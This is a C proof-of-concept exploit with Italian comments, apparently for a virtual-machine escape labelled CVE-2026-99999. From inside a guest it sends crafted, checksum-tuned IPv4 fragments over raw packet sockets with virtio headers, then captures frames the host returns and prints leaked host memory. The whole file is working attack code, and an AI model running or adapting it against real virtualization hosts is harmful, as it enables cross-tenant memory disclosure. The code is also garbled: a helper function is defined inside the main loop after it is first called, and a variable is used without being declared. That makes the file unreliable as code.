// pwnescape_guest_verify.c — CVE-2026-99999, verifica end-to-end lato guest
// gcc -O2 -Wall -o pwnesc pwnescape_guest_verify.c
#include <sys/ioctl.h>
#ifndef IP_MF
#define IP_MF 0x2000
#endif
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <poll.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/virtio_net.h>

#ifndef PACKET_VNET_HDR
#define PACKET_VNET_HDR 15
#endif

#define P2LEN   1456          /* payload frag2: len riassemblata 1484            */
#define GUARD   "\xde\xad\xbe\xef\xc0\xde\xf0\x0d"   /* 8 byte noti          */
#define GUARDL  8

static uint32_t be_sum(const uint8_t *p, int n) {
    uint32_t s = 0;
    for (int i = 0; i + 1 < n; i += 2) s += (p[i] << 8) | p[i+1];
    if (n & 1) s += p[n-1] << 8;
    return s;
}
static uint16_t fold16(uint32_t s) {
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}
static uint16_t iph_csum(const uint8_t *h, int len) {
    uint32_t s = be_sum(h, len);
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

/* Header IPv4 "riassemblato" come lo vede ip_frag_reasm(): tot_len finale,
 * frag_off=0, check ricalcolato. E' questo che skb_checksum_help() somma. */
static void reasm_header(uint8_t *h, uint32_t s, uint32_t d, uint16_t id,
                         int tot_len) {
    memset(h, 0, 20);
    h[0] = 0x45; h[1] = 0x00;
    *(uint16_t *)(h+2) = htons(tot_len);
    *(uint16_t *)(h+4) = htons(id);
    *(uint16_t *)(h+6) = 0;               /* DF=0, MF=0, offset 0 */
    h[8] = 64; h[9] = IPPROTO_UDP;
    memcpy(h+12, &s, 4); memcpy(h+16, &d, 4);
    *(uint16_t *)(h+10) = iph_csum(h, 20);
}

static void build_frag(uint8_t *f, const uint8_t *dst_mac, const uint8_t *src_mac,
                       uint32_t s, uint32_t d, uint16_t id, int mf_off,
                       const uint8_t *pl, int plen) {
    memset(f, 0, 22 + 20 + plen);
    memcpy(f, dst_mac, 6); memcpy(f+6, src_mac, 6);
    f[12]=0x88; f[13]=0xa8;
    f[14]=0x00; f[15]=0x0a; f[16]=0x81; f[17]=0x00;   /* QinQ: 2 tag */
    f[18]=0x00; f[19]=0x0a; f[20]=0x08; f[21]=0x00;
    uint8_t *ip = f + 22;
    ip[0]=0x45; ip[1]=0x00;
    *(uint16_t *)(ip+2) = htons(20+plen);
    *(uint16_t *)(ip+4) = htons(id);
    *(uint16_t *)(ip+6) = htons(mf_off);              /* frag2: 1, frag1: IP_MF */
    ip[8]=64; ip[9]=IPPROTO_UDP;
    memcpy(ip+12,&s,4); memcpy(ip+16,&d,4);
    memcpy(ip+20,pl,plen);
    *(uint16_t *)(ip+10) = iph_csum(ip,20);
}

static int get_ip(const char *ifname, uint32_t *out) {
    struct ifaddrs *ifa, *p; if (getifaddrs(&ifa)) return -1;
    for (p = ifa; p; p = p->ifa_next)
        if (p->ifa_addr && p->ifa_addr->sa_family == AF_INET &&
            !strcmp(p->ifa_name, ifname)) {
            *out = ((struct sockaddr_in *)p->ifa_addr)->sin_addr.s_addr;
            freeifaddrs(ifa); return 0;
        }
    freeifaddrs(ifa); return -1;
}

/* Estrae 32 byte di leak da un frame ricevuto con IHL=15 */
static int parse_pkt(const uint8_t *b, int n, uint16_t id, uint8_t leak[32]) {
    if (n < 14) return -1;
    int off = 14;
    uint16_t et = (b[12]<<8)|b[13];
    while ((et == 0x8100 || et == 0x88a8) && n >= off+4) {   /* robusto ai tag */
        et = (b[off+2]<<8)|b[off+3]; off += 4;
    }
    if (et != 0x0800 || n < off + 60) return -1;
    const uint8_t *ip = b + off;
    if ((ip[0] >> 4) != 4 || (ip[0] & 0x0f) != 15) return -1;
    if (((ip[4]<<8)|ip[5]) != id) return -1;
    if (memcmp(ip+20, GUARD, GUARDL)) return -1;   /* provenienza: i ns. guard */
    memcpy(leak, ip+28, 32);
    return 0;
}

int main(int argc, char **argv) {
    const char *ifname = argc > 1 ? argv[1] : "eth0";
    int iters = argc > 2 ? atoi(argv[2]) : 16;
    uint32_t me, s, d;
    if (get_ip(ifname, &me)) { perror("IP iface"); return 1; }
    s = d = me;                       /* src=dst=guest -> l'host fa forward e torna */
    uint16_t id = 0x1337;

    int txf = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    int on = 1;
    if (setsockopt(txf, SOL_PACKET, PACKET_VNET_HDR, &on, sizeof(on)) < 0) {
        perror("PACKET_VNET_HDR (l'iface deve supportare vnet_hdr)"); return 1;
    }
    int rxf = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    struct sockaddr_ll a = { .sll_family = AF_PACKET,
                             .sll_ifindex = if_nametoindex(ifname),
                             .sll_protocol = htons(ETH_P_ALL) };
    bind(rxf, (struct sockaddr *)&a, sizeof(a));

    const uint8_t dhost[6] = {0x02,0x00,0x00,0x00,0x00,0x01}; /* MAC gw/host */
    uint8_t shost[6]; {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        struct ifreq ifr; memset(&ifr,0,sizeof(ifr)); strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
        ioctl(fd, SIOCGIFHWADDR, &ifr); close(fd); memcpy(shost, ifr.ifr_hwaddr.sa_data, 6);
    }

    uint8_t p1[8]; memcpy(p1, GUARD, 8);
    uint8_t p2[P2LEN]; memset(p2, 0x41, sizeof(p2));
    uint8_t f1[22+20+8], f2[22+20+P2LEN];
    int tot = 20 + 8 + P2LEN;

    int hits = 0, seen[16]; uint8_t leaks[16][32]; memset(seen,0,sizeof(seen));

    for (int it = 0; it < iters; it++) {
        /* --- tuning: forziamo csum_fold(sum) a scrivere 0x4f 0x00 su iph[0] --- */
        uint8_t hdr[20]; reasm_header(hdr, s, d, id, tot);
        uint32_t fixed = be_sum(hdr,20) + be_sum(p1,8);
        int done = 0;
        for (int x = 0; x < 256 && !done; x++)
        for (int y = 0; y < 256 && !done; y++) {
            p2[0] = x; p2[1] = y;
            uint32_t sum = fixed + be_sum(p2, P2LEN);
            uint16_t f = fold16(sum);
            if (f == 0x004f || htons(f) == 0x004f) done = 1;  /* LE: 4f 00 */
        }
        if (!done) { fprintf(stderr, "tuning fallito\n"); return 1; }

        build_frag(f1, dhost, shost, s, d, id, IP_MF, p1, 8);
        build_frag(f2, dhost, shost, s, d, id, 1, p2, P2LEN);

        /* frag2 prima: frag1 arriva per ultimo -> diventa head del riassemblato */
        struct sockaddr_ll t = { .sll_family=AF_PACKET, .sll_ifindex=a.sll_ifindex,
                                 .sll_halen=6 };
        memcpy(t.sll_addr, dhost, 6);
        send_vnet(txf, &t, f2, sizeof(f2), 0, 0, 0);
        usleep(2000);
        /* frag1: CHECKSUM_PARTIAL con il drift */
        send_vnet(txf, &t, f1, sizeof(f1), 22, 0, VIRTIO_NET_HDR_F_NEEDS_CSUM);

        static int send_vnet(int fd, struct sockaddr_ll *t, const uint8_t *frame, int flen,
                     uint16_t csum_start, uint16_t csum_offset, uint8_t flags)
        {
            static uint8_t buf[2048];
            if (sizeof(*vh) + flen > sizeof(buf)) return -1;
            memset(vh, 0, sizeof(*vh));
            vh->flags       = flags;
            vh->csum_start  = htons(csum_start);
            vh->csum_offset = htons(csum_offset);
            memcpy(buf + sizeof(*vh), frame, flen);
            return sendto(fd, buf, sizeof(*vh) + flen, 0,
                        (struct sockaddr *)t, sizeof(*t));
        }

        /* --- attesa del frammento corrotto che l'host rispedisce --- */
        struct pollfd pf = { .fd = rxf, .events = POLLIN };
        long long deadline = 300; /* ms */
        while (deadline > 0 && poll(&pf, 1, 20) > 0) {
            uint8_t buf[4096]; int n;
            while ((n = recv(rxf, buf, sizeof(buf), MSG_DONTWAIT)) > 0) {
                uint8_t lk[32];
                if (parse_pkt(buf, n, id, lk) == 0) {
                    int dup = 0;
                    for (int i = 0; i < hits; i++)
                        if (!memcmp(leaks[i], lk, 32)) dup = 1;
                    if (!dup && hits < 16) memcpy(leaks[hits++], lk, 32);
                    deadline = 0; goto next;
                }
            }
            deadline -= 20;
        }
next:   usleep(5000);
    }

    printf("[*] %d/%d iterazioni con IHL=15 e guard intatto\n", hits, iters);
    for (int i = 0; i < hits; i++) {
        printf("[leak %d] ", i);
        for (int j = 0; j < 32; j++) printf("%02x%s", leaks[i][j], (j%16==15)?"\n         ":" ");
        printf("\n");
    }
    return hits ? 0 : 2;
}